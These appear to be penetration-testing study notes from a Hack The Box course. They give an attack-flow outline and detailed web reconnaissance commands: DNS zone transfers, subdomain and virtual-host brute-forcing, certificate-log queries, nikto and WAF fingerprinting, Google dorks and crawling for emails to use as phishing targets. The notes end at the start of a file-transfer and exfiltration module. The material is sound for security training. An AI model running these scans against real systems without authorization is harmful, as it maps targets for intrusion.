Attack Flow Summary

1. Internet Presence
   └─ crt.sh → subdomains
   └─ DNS records (dig any, dig axfr) → full zone map
   └─ Shodan → open ports + service versions per IP
   └─ Cloud storage (Google Dorks, GrayHatWarfare) → leaked files
   └─ Staff OSINT (LinkedIn, GitHub) → tech stack, leaked keys

2. Host Discovery → Nmap (Module 03)

3. Service Footprinting (this module)
   └─ FTP → anonymous access, file download/upload
   └─ SMB → null sessions, user enumeration, share access
   └─ NFS → unauthenticated mount, UID spoofing
   └─ DNS → zone transfers, subdomain brute force
   └─ SMTP → open relay, user enumeration via VRFY
   └─ IMAP/POP3 → read emails with creds
   └─ SNMP → community string → system dump + users
   └─ MySQL/MSSQL/Oracle → DB access, file read/write, RCE
   └─ IPMI → RAKP hash dump → crack → password reuse
   └─ SSH/RDP/WinRM/WMI → remote access with found creds

4. Password reuse across ALL found services
   └─ Credentials from one service → try on every other service
Recon & Enumeration/Module 05

Information Gathering: Web Edition

Overview

Web Reconnaissance is the very first phase of any penetration test or security assessment. Before you touch anything on a target, you spend time silently (or actively) gathering as much information as possible. Think of it like a detective building a dossier before making a move.

Why It Matters

Goal What You're Looking For
Identifying Assets All domains, subdomains, IP addresses — mapping the full online presence
Uncovering Hidden Info Directories, files, configs, backup files not publicly linked
Analyzing the Attack Surface Open ports, running services, software versions, misconfigurations
Gathering Intelligence Employee names, email addresses, technologies — useful for social engineering

Both attackers and defenders use recon. Attackers tailor their exploits; defenders use it to find and patch gaps before attackers do.

Reconnaissance Types

Active vs Passive

Active  → You directly interact with the target (higher detection risk)
Passive → You gather from public sources, never touching the target (stealthy)

Active Reconnaissance

You're sending packets, probes, or requests directly to the target. It leaves logs.

Technique Description Tools Detection Risk
Port Scanning Find open ports and running services nmap, masscan, unicornscan High
Vulnerability Scanning Probe for known CVEs, misconfigs, SQLi, XSS nessus, openvas, nikto High
Network Mapping Map network topology via packet routing traceroute, nmap Medium–High
Banner Grabbing Read service banners to identify software versions netcat, curl Low
OS Fingerprinting Identify the operating system of the target nmap -O, xprobe2 Low
Service Enumeration Determine exact versions of services on open ports nmap -sV Low
Web Spidering Crawl the target site to map structure burp suite spider, owasp zap, scrapy Low–Medium

Passive Reconnaissance

You're collecting information without ever touching the target directly. Everything comes from public sources.

Technique Description Tools Detection Risk
Search Engine Queries Google/Bing dorking for exposed data google, duckduckgo, shodan Very Low
WHOIS Lookups Domain registration details whois, online services Very Low
DNS Analysis Enumerate DNS records dig, nslookup, dnsenum, fierce Very Low
Web Archive Analysis Historical snapshots of the site Wayback Machine Very Low
Social Media Analysis Employee info, org structure LinkedIn, Twitter, OSINT tools Very Low
Code Repositories Leaked credentials, API keys, configs GitHub, GitLab Very Low

WHOIS

What Is It?

WHOIS is a query-response protocol — essentially a phonebook for the internet. It stores registration records for domain names, IP blocks, and autonomous systems. When a domain is registered, the registrant's details are submitted to a WHOIS database.

Privacy note: GDPR (2018) pushed many registrars to mask personal info behind privacy services. WHOIS data may be incomplete or anonymized. Always cross-verify with other sources.

What WHOIS Records Contain

  • Domain Name — the actual domain (e.g., example.com)
  • Registrar — company where domain was registered (e.g., GoDaddy, Namecheap)
  • Registrant Contact — person/org that registered it
  • Administrative Contact — person managing the domain
  • Technical Contact — person handling technical issues
  • Creation & Expiration Dates — when registered, when it expires
  • Name Servers — servers that resolve the domain to an IP

Installing WHOIS

sudo apt update
sudo apt install whois -y

Basic WHOIS Lookup

whois example.com

Why: You're trying to identify who owns the domain, what registrar they use, when it was registered, which nameservers it uses, and any contact information.

🔍 What to look for
- Recent registration dates → possibly malicious (phishing, C2 infrastructure)
- Privacy service masking the owner → suspicious in certain contexts
- Nameservers pointing to bulletproof hosting → threat actor infrastructure
- Shared nameservers across multiple suspicious domains → clustered attacker infrastructure
➜ What to do next Cross-reference the registrar, nameservers, and registrant against threat intel sources. Look up the hosting provider's abuse history.

Real Example — facebook.com

whois facebook.com

Key output fields:

Registrar: RegistrarSafe, LLC
Creation Date: 1997-03-29
Expiry Date: 2033-03-30
Registrant Organization: Meta Platforms, Inc.
Name Servers: A.NS.FACEBOOK.COM, B.NS.FACEBOOK.COM ...
Domain Status: clientDeleteProhibited, serverTransferProhibited ...

Interpretation:
- Domain registered in 1997 → long-established, legitimate
- Meta owns it → matches expectation
- All nameservers are internal (facebook.com) → Meta manages own DNS, indicating large infrastructure
- Locked statuses → protected against unauthorized transfer or deletion

Threat Intelligence Use Cases

Scenario 1 — Phishing Investigation
A suspicious email links to a domain. WHOIS reveals: registered 2 days ago, hidden registrant, nameservers at a known bulletproof host → almost certainly a phishing domain.

Scenario 2 — Malware C2 Analysis
Malware phones home to a domain. WHOIS shows: registered via free anonymous email, registered in a high-cybercrime country, registrar with lax abuse policies → likely malicious C2 infrastructure.

Scenario 3 — Threat Actor Profiling
Multiple domains linked to a threat group. WHOIS pattern analysis reveals: domains registered in clusters before attacks, shared nameservers, multiple fake registrant identities → building a TTPs profile for an intelligence report.

Historical WHOIS

Use WhoisFreaks to access historical WHOIS records and track changes in ownership, contacts, or nameservers over time.

DNS

What Is DNS?

The Domain Name System is the internet's GPS. You type www.example.com, DNS translates it to 192.0.2.1 so your browser can actually connect. Without DNS, you'd have to memorize IP addresses for every site.

How DNS Resolution Works (Step by Step)

1. You type www.example.com
2. Your computer checks its local cache → not found
3. Asks DNS Resolver (your ISP or 8.8.8.8)
4. Resolver checks its cache → not found
5. Resolver asks Root Name Server → "Ask the .com TLD server"
6. Resolver asks .com TLD Server → "Ask example.com's authoritative server"
7. Resolver asks Authoritative Name Server → returns IP: 192.0.2.1
8. Resolver caches it and returns IP to your computer
9. Your browser connects to 192.0.2.1

The Hosts File

Before DNS resolves anything, your OS checks /etc/hosts (Linux/macOS) or C:\Windows\System32\drivers\etc\hosts (Windows). This lets you manually map hostnames to IPs — bypassing DNS entirely.

# Format:
<IP Address> <Hostname> [Alias ...]

# Examples:
127.0.0.1    myapp.local          # redirect to local dev server
0.0.0.0      unwanted-site.com    # block a website
192.168.1.10 devserver.local      # internal lab machine

Pentest use: When you discover a virtual host that has no DNS record, you add it to your hosts file to access it directly.

DNS Record Types

Record Full Name Description Example
A Address Record Maps hostname → IPv4 www.example.com → 192.0.2.1
AAAA IPv6 Address Record Maps hostname → IPv6 www.example.com → 2001:db8::1
CNAME Canonical Name Alias pointing to another hostname blog.example.com → webserver.net
MX Mail Exchange Specifies mail servers for the domain example.com → mail.example.com
NS Name Server Authoritative nameserver for the zone example.com → ns1.example.com
TXT Text Record Arbitrary text — SPF, DKIM, domain verification v=spf1 mx -all
SOA Start of Authority Zone admin info — primary NS, serial, refresh see zone file example
SRV Service Record Hostname + port for specific services _sip._udp.example.com → sipserver
PTR Pointer Record Reverse DNS — IP → hostname 1.2.0.192.in-addr.arpa → www.example.com

DNS Zone File Example

$TTL 3600
@ IN SOA ns1.example.com. admin.example.com. (
    2024060401 ; Serial
    3600       ; Refresh
    900        ; Retry
    604800     ; Expire
    86400 )    ; Minimum TTL

@ IN NS ns1.example.com.
@ IN NS ns2.example.com.
@ IN MX 10 mail.example.com.
www  IN A     192.0.2.1
mail IN A     198.51.100.1
ftp  IN CNAME www.example.com.

IN stands for "Internet" — it's the DNS class indicating the standard Internet protocol suite. You'll see it in every record.

DNS Tools

Tool Best For
dig Detailed, flexible manual DNS queries
nslookup Quick, simple lookups
host Fast, minimal output
dnsenum Automated enumeration + brute-force
fierce Recursive subdomain discovery
dnsrecon Comprehensive multi-technique enumeration
theHarvester OSINT — emails + subdomains from multiple sources

dig — Domain Information Groper

dig is your primary tool for manual DNS interrogation. It's precise, customizable, and shows you exactly what the DNS server returned.

Common dig Commands

# Default A record lookup
dig domain.com

# Specific record types
dig domain.com A        # IPv4 address
dig domain.com AAAA     # IPv6 address
dig domain.com MX       # Mail servers
dig domain.com NS       # Nameservers
dig domain.com TXT      # Text records (SPF, DKIM, etc.)
dig domain.com CNAME    # Alias records
dig domain.com SOA      # Zone authority info

# Query a specific nameserver
dig @1.1.1.1 domain.com

# Trace the full DNS resolution path
dig +trace domain.com

# Reverse lookup (IP → hostname)
dig -x 192.168.1.1

# Short output — just the answer
dig +short domain.com

# Only the answer section, no metadata
dig +noall +answer domain.com

# Request ALL record types (many servers ignore this per RFC 8482)
dig domain.com ANY

Understanding dig Output

dig google.com

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16449
;; flags: qr rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;google.com.    IN A

;; ANSWER SECTION:
google.com.  0  IN A  142.251.47.142

;; Query time: 0 msec
;; SERVER: 172.23.176.1#53(172.23.176.1) (UDP)
;; WHEN: Thu Jun 13 10:45:58 SAST 2024
;; MSG SIZE rcvd: 54
Section Meaning
HEADER NOERROR = successful query. Flags: qr = response, rd = recursion requested, ad = data authenticated
QUESTION SECTION What was asked — google.com IN A means "IPv4 address for google.com"
ANSWER SECTION The result — 142.251.47.142 is Google's IP. 0 = TTL (seconds to cache)
SERVER Which DNS server answered and over which protocol (UDP)
MSG SIZE Size of the DNS response packet (54 bytes)

Why use dig +short:

dig +short hackthebox.com
# 104.18.20.126
# 104.18.21.126

When you just need the IP and nothing else — quick confirmation during recon.

Why DNS matters for recon:
- CNAME pointing to an old server → may be vulnerable
- NS records → reveals the hosting provider
- New vpn.example.com subdomain → possible new entry point
- TXT record with _1password=... → org uses 1Password (social engineering target)

Subdomains

Why Subdomains Matter

Subdomains extend the main domain and often host different services:
- mail.example.com → email server
- dev.example.com → development environment (often less secured)
- staging.example.com → pre-production, may have vulnerabilities
- admin.example.com → admin panel, not meant for public access
- vpn.example.com → new network entry point

Forgotten or legacy subdomains are goldmines — outdated software, default credentials, relaxed security.

Two Approaches to Subdomain Enumeration

Approach Description Risk
Active Directly query DNS, brute-force names Higher (detectable)
Passive Use CT logs, search engines, public databases Very low (stealthy)

Active — Subdomain Brute-Forcing with dnsenum

dnsenum is a comprehensive DNS enumeration tool written in Perl. It combines brute-forcing, zone transfer attempts, Google scraping, WHOIS, and reverse lookups into one tool.

Install: Usually pre-installed on Kali/Pwnbox. If not:

sudo apt install dnsenum

Basic brute-force enumeration:

dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

With recursive enumeration:

dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
Flag Meaning
--enum Shortcut enabling key enumeration features
-f <wordlist> Path to wordlist of potential subdomain names
-r Recursive — if a subdomain is found, also brute-force its subdomains

Why: You're systematically testing thousands of potential subdomain names against the target's DNS server. Each name gets appended to the domain (e.g., dev.inlanefreight.com, staging.inlanefreight.com) and queried. Valid ones resolve to an IP.

What dnsenum does automatically:
- Retrieves A, AAAA, NS, MX, TXT records
- Attempts zone transfers from discovered nameservers
- Brute-forces subdomains from your wordlist
- Can scrape Google for additional subdomains
- Performs reverse lookups

What to look for in output:

www.inlanefreight.com.     300 IN A  134.209.24.248
support.inlanefreight.com. 300 IN A  134.209.24.248

Multiple subdomains pointing to the same IP → probably the same server hosting multiple virtual hosts. Add them to your hosts file and explore each one.

Wordlist source: SecLists — /Discovery/DNS/

Other brute-force tools:

Tool Notes
fierce User-friendly, recursive, wildcard detection
dnsrecon Multi-technique, customizable output formats
amass Actively maintained, integrates many data sources
assetfinder Lightweight, quick scans
puredns Fast DNS brute-forcing with filtering
ffuf General fuzzer, can be used for subdomain brute-forcing
gobuster DNS mode for subdomain enumeration

Passive — Certificate Transparency Logs

CT logs record every SSL/TLS certificate ever issued. These certificates include a Subject Alternative Name (SAN) field listing all subdomains the cert covers — a definitive historical record.

Query crt.sh from the terminal:

curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
Part What It Does
curl -s Silently fetch JSON from crt.sh (%25 = URL-encoded %, used as wildcard)
jq -r '.[].name_value' Extract all domain/subdomain entries from the JSON
sed 's/\*\.//g' Remove wildcard prefixes (*.) from results
sort -u Sort alphabetically and remove duplicates

Why this beats brute-forcing: You're not guessing — you're reading a public record of every cert ever issued. Even subdomains that no longer exist in DNS may appear here.

crt.sh web interface: https://crt.sh

Find only 'dev' subdomains on facebook.com:

curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u

Returns: dev.facebook.com, *.dev.facebook.com, secure.dev.facebook.com, etc.

Alternative: Censys — https://censys.io — more powerful filtering, API access, requires free registration.

Zone Transfers

What Is a Zone Transfer?

A DNS Zone Transfer (AXFR) is a mechanism for replicating all DNS records from a primary to a secondary DNS server. It's designed for redundancy — keeping backup servers in sync.

When successful (from an attacker's perspective), you get the complete DNS zone file — every subdomain, every IP address, every mail server config, every record in the domain.

The Vulnerability

Historically, any client could request a zone transfer. Modern DNS servers restrict this to authorized secondary servers only. But misconfigurations still exist, and attempting a zone transfer during recon is always worth trying.

Zone Transfer Process

1. Secondary server sends AXFR request to primary
2. Primary responds with SOA record (zone version info)
3. Primary sends ALL DNS records one by one
4. Transfer complete signal sent
5. Secondary acknowledges receipt

Attempting a Zone Transfer

dig axfr @nsztm1.digi.ninja zonetransfer.me
Part Meaning
axfr Request full zone transfer
@nsztm1.digi.ninja Query this specific nameserver
zonetransfer.me Target domain

zonetransfer.me is a deliberately misconfigured demo domain set up to demonstrate zone transfer risks. It will return a full zone transfer.

First, find the nameservers for your target:

dig NS target.com

Then attempt the transfer against each nameserver found:

dig axfr @ns1.target.com target.com

What successful output looks like:

zonetransfer.me.  7200 IN SOA  nsztm1.digi.ninja. robin.digi.ninja. ...
zonetransfer.me.  7200 IN A    5.196.105.14
zonetransfer.me.  7200 IN NS   nsztm1.digi.ninja.
canberra-office.zonetransfer.me.  7200 IN A  202.14.81.230
...

What you gain from a successful zone transfer:
- Complete list of all subdomains (including hidden ones)
- IP addresses for every subdomain
- Mail server configuration
- Any internal naming conventions (e.g., dc01, prod-db, backup-srv)

➜ What to do next Map all discovered subdomains, add them to your hosts file, and begin fingerprinting each service individually.

Virtual Hosts

What Is Virtual Hosting?

Virtual hosting lets one IP address host multiple websites. The web server uses the HTTP Host header in each request to determine which site to serve.

IP: 192.0.2.1
  ├── www.example1.com   → /var/www/example1
  ├── www.example2.org   → /var/www/example2
  └── admin.internal     → /var/www/admin (no DNS record!)

Why This Matters for Recon

Scanning the IP alone won't reveal all hosted sites. A hidden virtual host (admin.internal) may not have a DNS record but is still accessible if you know to ask for it — by setting the Host header manually.

Key insight: If a virtual host has no public DNS record, it's still reachable if you add it to your /etc/hosts file pointing to the server's IP.

Types of Virtual Hosting

Type How It Works Notes
Name-Based Uses HTTP Host header to differentiate Most common, no extra IPs needed
IP-Based Each site has a unique IP Expensive, doesn't scale well
Port-Based Different ports for different sites Less common, requires specifying port in URL

Apache Virtual Host Config Example

<VirtualHost *:80>
    ServerName www.example1.com
    DocumentRoot /var/www/example1
</VirtualHost>

<VirtualHost *:80>
    ServerName www.example2.org
    DocumentRoot /var/www/example2
</VirtualHost>

Virtual Host Discovery with gobuster

gobuster in vhost mode systematically sends HTTP requests with different Host headers to the target IP. Any that return a valid (non-404) response reveals an active virtual host.

Install:

sudo apt install gobuster

Basic vhost brute-force:

gobuster vhost -u http://192.0.2.1 -w hostnames.txt --append-domain

Against a known domain on a non-standard port:

gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
Flag Meaning
-u Target URL (use the IP or base domain)
-w Wordlist of potential hostnames
--append-domain Appends the base domain to each word (required in newer versions)
-t Number of threads (increase for speed)
-k Ignore SSL/TLS certificate errors
-o Save output to file

Sample output:

Found: forum.inlanefreight.htb:81 Status: 200 [Size: 100]
➜ What to do next Add the discovered vhost to /etc/hosts, then explore it in your browser and with your fingerprinting tools.

Warning: VHost fuzzing generates significant traffic and can trigger IDS/WAF alerts. Always have written authorization before running this.

Adding a VHost to /etc/hosts

echo "134.209.24.248  forum.inlanefreight.htb" >> /etc/hosts

Certificate Transparency Logs

What Are CT Logs?

Certificate Transparency (CT) logs are public, append-only ledgers maintained by independent organizations. Every SSL/TLS certificate issued by a Certificate Authority (CA) must be submitted to multiple CT logs. Anyone can inspect them.

Reference: https://certificate.transparency.dev

Why They Matter for Recon

  • No guessing — you get a factual, historical record of every cert ever issued
  • Wildcard certs expose entire subdomain ranges
  • Expired certs point to old subdomains that might still be live but forgotten
  • SAN fields (Subject Alternative Names) list every domain/subdomain the cert covers

CT Log Security Model (Merkle Tree)

CT logs use a Merkle tree structure for integrity:
- Every certificate is a leaf node
- Parent nodes are cryptographic hashes of their children
- The Merkle Root is one hash representing the entire log
- Tampering with any entry changes the root → immediately detectable

Searching CT Logs — crt.sh

Web UI: https://crt.sh

From terminal — all subdomains for a domain:

curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

Filter for specific subdomains (e.g., 'dev' on facebook.com):

curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u

Command breakdown:

Part Purpose
curl -s "https://crt.sh/?q=..." Fetch JSON results (silent mode, no progress bar)
output=json Get structured JSON instead of HTML
jq -r '.[] | select(...) Filter entries containing a specific string
.name_value The domain/subdomain field in each cert record
sort -u Sort and deduplicate output

Alternative: Censys
https://censys.io — more advanced filtering, including filtering by IP, certificate attributes, and misconfigurations. Requires free account registration for API access.

Fingerprinting

What Is Fingerprinting?

Fingerprinting identifies the technology stack powering a target — web server, OS, CMS, frameworks, WAF. Like a fingerprint identifies a person, these technical signatures reveal what software is running so you can focus on known vulnerabilities for those specific versions.

Why It Matters

  • Targeted attacks — know exactly which CVEs apply
  • Misconfigurations — outdated software, default settings
  • Prioritization — focus on systems most likely vulnerable
  • Holistic profile — combine with other recon for a full picture

Fingerprinting Techniques

Method How It Works
Banner Grabbing Read service banners (HTTP headers, SSH banners)
HTTP Headers Analysis Server, X-Powered-By, X-Redirect-By headers reveal software
Probing for Specific Responses Error messages and behavior unique to certain software
Page Content Analysis Copyright notices, HTML comments, JS file paths, wp- prefixes

Tool 1: curl — Banner Grabbing

curl -I inlanefreight.com

-I (or --head) fetches only the HTTP headers, not the page body.

Why: You're reading the server's response headers to identify what software is running, what version, and any interesting redirects.

Example output:

HTTP/1.1 301 Moved Permanently
Server: Apache/2.4.41 (Ubuntu)
Location: https://inlanefreight.com/

This tells you: Apache 2.4.41 on Ubuntu. Now check the HTTPS version:

curl -I https://inlanefreight.com

Server: Apache/2.4.41 (Ubuntu)
X-Redirect-By: WordPress
Location: https://www.inlanefreight.com/

X-Redirect-By: WordPress → the site is running WordPress. Check the final URL:

curl -I https://www.inlanefreight.com

Server: Apache/2.4.41 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"

wp-json → WordPress REST API. The wp- prefix is a dead giveaway.

➜ What to do next Look up CVEs for Apache 2.4.41. Check for WordPress vulnerabilities. Run nikto and wpscan.

Tool 2: wafw00f — WAF Detection

Before probing further, check if a Web Application Firewall (WAF) is in place. WAFs can block your scans or give false results.

Install:

pip3 install git+https://github.com/EnableSecurity/wafw00f

Run it:

wafw00f inlanefreight.com

Sample output:

[+] The site https://inlanefreight.com is behind Wordfence (Defiant) WAF.

What this means: Wordfence is a popular WordPress WAF. It may block aggressive scanning. You'll need to tune your tools to avoid tripping it, or use passive methods where possible.

Tool 3: nikto — Web Server Scanner + Fingerprinting

Nikto is an open-source web server scanner that checks for outdated software, dangerous files, misconfigurations, and security issues.

Install:

sudo apt update && sudo apt install -y perl
git clone https://github.com/sullo/nikto
cd nikto/program
chmod +x ./nikto.pl

Run fingerprinting only (Software Identification modules):

nikto -h inlanefreight.com -Tuning b
Flag Meaning
-h Target hostname/IP
-Tuning b Only run Software Identification modules (fingerprinting)

Sample findings from nikto:

+ Server: Apache/2.4.41 (Ubuntu)
+ Apache/2.4.41 appears to be outdated (current is at least 2.4.59)
+ /: A Wordpress installation was found.
+ /wp-login.php: Wordpress login found.
+ /license.txt: License file found may identify site software.
+ Missing Strict-Transport-Security header
+ X-Content-Type-Options header not set

Interpreting results:
- Outdated Apache → check CVE database for 2.4.41 vulnerabilities
- WordPress login page → target for brute-force or credential stuffing
- license.txt → may reveal exact plugin/theme versions
- Missing security headers → less mature security posture

Fingerprinting Tools Reference

Tool Type Use
Wappalyzer Browser extension + web service Identifies CMS, frameworks, analytics, libraries
BuiltWith Web service Detailed tech stack reports (builtwith.com)
WhatWeb CLI Uses signature database to identify technologies
Nmap CLI Service/OS fingerprinting with NSE scripts
Netcraft Web service Tech stack + hosting provider + security posture
wafw00f CLI Identifies WAF type and configuration

Web Crawling

What Is Web Crawling?

A web crawler (spider) automatically follows links from page to page, collecting information about a site's structure. It starts at a seed URL, fetches the page, extracts all links, adds them to a queue, and processes each one.

Crawling is different from fuzzing. Crawling follows real links. Fuzzing guesses paths.

Crawling Strategies

Breadth-First: Explore all links on the current level before going deeper. Good for broad structural overview.

Depth-First: Follow one path as deep as possible before backtracking. Good for finding deeply nested content.

What Crawlers Extract

Data Type Why It Matters
Internal/External Links Map site structure, find hidden pages, identify external relationships
Comments HTML comments often contain developer notes, internal paths, credentials
Metadata Page titles, descriptions, author names, dates — context for content
Sensitive Files .bak, .old, web.config, settings.php, error_log — potential credential/config leaks
Form Fields Input points for injection testing
JS Files API endpoints, authentication logic, hardcoded secrets

robots.txt

robots.txt sits at the root of every website (https://example.com/robots.txt). It tells search engine bots which areas to avoid. For recon, it's a treasure map — everything marked Disallow is interesting.

Example robots.txt:

User-agent: *
Disallow: /admin/
Disallow: /private/
Allow: /public/

User-agent: Googlebot
Crawl-delay: 10
Sitemap: https://www.example.com/sitemap.xml

Reading this:
- /admin/ is off-limits → there's an admin panel here, go check it
- /private/ is hidden → sensitive content likely
- Sitemap at the listed URL → get a complete list of all public pages

Note: robots.txt is advisory, not enforced. A malicious bot ignores it. But as a security researcher with authorization, you read it for intel, then decide whether to probe those paths.

.well-known URIs

Defined in RFC 8615, the /.well-known/ directory provides standardized metadata endpoints. The IANA maintains a registry of all valid URIs.

IANA Registry: https://www.iana.org/assignments/well-known-uris/

URI Purpose
/.well-known/security.txt Contact info for security researchers to report vulnerabilities (RFC 9116)
/.well-known/change-password Standard URL for password change page
/.well-known/openid-configuration OpenID Connect provider configuration
/.well-known/assetlinks.json Google's Digital Asset Links — app/domain ownership verification
/.well-known/mta-sts.txt SMTP MTA-STS email security policy (RFC 8461)

Most valuable for recon — openid-configuration:

curl https://example.com/.well-known/openid-configuration

Returns JSON:

{
  "issuer": "https://example.com",
  "authorization_endpoint": "https://example.com/oauth2/authorize",
  "token_endpoint": "https://example.com/oauth2/token",
  "userinfo_endpoint": "https://example.com/oauth2/userinfo",
  "jwks_uri": "https://example.com/oauth2/jwks",
  "scopes_supported": ["openid", "profile", "email"]
}

What this reveals:
- All OAuth2/OIDC endpoints → test for misconfigurations
- jwks_uri → cryptographic keys in use
- Supported scopes and response types → understand auth implementation

Tool: Scrapy

Scrapy is a Python framework for building custom web crawlers. It's powerful, efficient, and production-grade.

Install:

pip3 install scrapy

Download the HTB ReconSpider:

wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip

Run the spider:

python3 ReconSpider.py http://inlanefreight.com

Why: ReconSpider crawls the entire target site and collects emails, links, external files, JS files, images, and HTML comments — automatically.

Output file: results.json

{
  "emails": ["[email protected]", "[email protected]"],
  "links": ["https://www.inlanefreight.com/index.php/offices/", ...],
  "external_files": ["https://www.inlanefreight.com/wp-content/uploads/2020/09/goals.pdf"],
  "js_files": ["https://www.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js"],
  "form_fields": [],
  "images": ["https://www.inlanefreight.com/wp-content/uploads/2021/03/AboutUs_01.png"],
  "videos": [],
  "audio": [],
  "comments": ["<!-- #masthead -->"]
}

Analyzing output:

# Extract all unique links
jq -r '.[] | select(.file != null) | .file' results.json | sort -u

# View all emails
jq -r '.emails[]' results.json

# View all HTML comments
jq -r '.comments[]' results.json
🔍 What to look for
- Emails → phishing targets, employee names, domain format
- External files (PDFs, docs) → may contain metadata with internal paths/usernames
- JS files → API endpoints, hardcoded tokens
- Comments → developer notes, internal hostnames, TODO items

Other Web Crawlers

Tool Notes
Burp Suite Spider Integrated with Burp for active webapp testing
OWASP ZAP Spider Free, open-source, both automated and manual modes
Apache Nutch Scalable Java-based crawler, for large-scale recon

Search Engine Discovery

What Is It?

Also called OSINT (Open Source Intelligence) gathering. Using search engines to find publicly indexed information about your target — without touching the target's systems at all.

Why Use It

  • Legal and ethical — all info is publicly accessible
  • Broad scope — search engines index enormous amounts of data
  • No special skills needed — operators are learnable in minutes
  • Free — no cost, no account required

Search Operators (Google Dorking)

Operator Description Example
site: Restrict results to one domain site:example.com "password reset"
inurl: Term must appear in URL inurl:admin login
filetype: Limit to specific file type filetype:pdf "confidential report"
intitle: Term must appear in page title intitle:"index of" /backup
intext: / inbody: Term must appear in page body intext:"password reset"
cache: View Google's cached version cache:example.com
link: Pages linking to a URL link:example.com
related: Similar websites related:example.com
info: Summary info about a page info:example.com
define: Definition of a term define:phishing
allintext: All terms must be in body allintext:admin password reset
allinurl: All terms must be in URL allinurl:admin panel
allintitle: All terms must be in title allintitle:confidential report 2023
AND Both terms required site:example.com AND (inurl:admin OR inurl:login)
OR Either term "linux" OR "ubuntu" OR "debian"
NOT / - Exclude a term site:bank.com NOT inurl:login
* Wildcard site:example.com filetype:pdf user* manual
.. Number range site:shop.com "price" 100..500
" " Exact phrase "information security policy"

Google Dorks — Practical Examples

Finding login pages:

site:example.com inurl:login
site:example.com (inurl:login OR inurl:admin)

Exposed files:

site:example.com filetype:pdf
site:example.com (filetype:xls OR filetype:docx)

Configuration files:

site:example.com inurl:config.php
site:example.com (ext:conf OR ext:cnf)

Database backups:

site:example.com inurl:backup
site:example.com filetype:sql

Reference: Google Hacking Database (GHDB) — a community-maintained collection of powerful dorks.

Applications of Search Engine Discovery

Use Case What You're Doing
Security Assessment Finding vulnerabilities, exposed data, attack vectors
Competitive Intelligence Learning about competitors' tech stack and strategy
Investigative Journalism Uncovering hidden connections and unethical practices
Threat Intelligence Tracking malicious actors, identifying emerging threats

Web Archives — Wayback Machine

What Is It?

The Wayback Machine (https://web.archive.org) is a digital archive of the web operated by the Internet Archive (non-profit). It has been capturing website snapshots since 1996, with over 866 billion pages saved.

How It Works

  1. Crawling — automated bots browse the web and download page copies
  2. Archiving — pages stored with timestamp → historical snapshot
  3. Accessing — enter any URL + select a date → view the site as it was then

Archiving frequency varies: popular sites may be captured multiple times daily; obscure sites perhaps a few times per year.

Why It Matters for Recon

Use Case Detail
Uncovering Hidden Assets Old pages, directories, files, subdomains no longer in current DNS
Tracking Changes Compare snapshots to see how tech stack or structure evolved
Gathering Intelligence Past marketing copy, employee mentions, technology choices
Stealthy Recon Completely passive — you never interact with the target

Finding Old Content

  1. Go to https://web.archive.org
  2. Enter the target URL
  3. Select an early date from the calendar
  4. Browse the archived version
🔍 What to look for
- Old admin panels that were removed but the path still works on the current site
- Backup files linked in old pages
- Former subdomains that may still be live
- Old API documentation revealing endpoints
- Previous tech stack (might still have the old version running somewhere)
- Employee names/emails from old "About Us" pages

Automating Recon

Why Automate?

Benefit Detail
Efficiency Run repetitive tasks in seconds instead of hours
Scalability Enumerate dozens of subdomains/targets simultaneously
Consistency Same process every time, no human error
Coverage Combine DNS, WHOIS, crawling, port scanning in one run

Tool: FinalRecon

FinalRecon is a Python-based all-in-one recon tool. It wraps WHOIS, DNS, SSL, subdomain enumeration, directory brute-forcing, and Wayback Machine queries into a single framework.

GitHub: https://github.com/thewhiteh4t/FinalRecon

Install:

git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon
pip3 install -r requirements.txt
chmod +x ./finalrecon.py
./finalrecon.py --help

Key options:

Option What It Does
--url URL Target URL
--headers Grab HTTP response headers
--sslinfo SSL certificate details (issuer, expiry, SANs)
--whois WHOIS lookup
--crawl Crawl the target site
--dns DNS enumeration (40+ record types including DMARC)
--sub Subdomain enumeration (crt.sh, VirusTotal, Shodan, etc.)
--dir Directory brute-forcing
--wayback Pull URLs from Wayback Machine (last 5 years)
--ps Fast port scan
--full Run everything
-w <wordlist> Custom wordlist for directory/subdomain enum
-k <key> Add API key (e.g., for Shodan)
-o <format> Output format (default: txt)

Example — headers + WHOIS:

./finalrecon.py --headers --whois --url http://inlanefreight.com

Full recon run:

./finalrecon.py --full --url http://inlanefreight.com

Quick Reference — Commands Cheatsheet

WHOIS

DNS — dig

# dnsenum brute-force
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# dnsenum with recursion
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r

jq -r '.links[]' results.json
jq -r '.comments[]' results.json
jq -r '.[] | select(.file != null) | .file' results.json | sort -u

# Check robots.txt
curl https://target.com/robots.txt

# Check .well-known
curl https://target.com/.well-known/security.txt
curl https://target.com/.well-known/openid-configuration

FinalRecon

git clone https://github.com/thewhiteh4t/FinalRecon.git
cd FinalRecon && pip3 install -r requirements.txt
./finalrecon.py --headers --whois --url http://target.com
./finalrecon.py --dns --sub --url http://target.com
./finalrecon.py --full --url http://target.com

Last updated: 2026 · HTB CPTS Path · Module 05

Access & Tooling/Module 07

File Transfers

Overview

File transfers are a core skill in penetration testing. Whether you're uploading a privilege escalation exploit or exfiltrating enumeration data, you need reliable methods that work within the constraints of each target environment.

Why This Matters

During any engagement you may face:
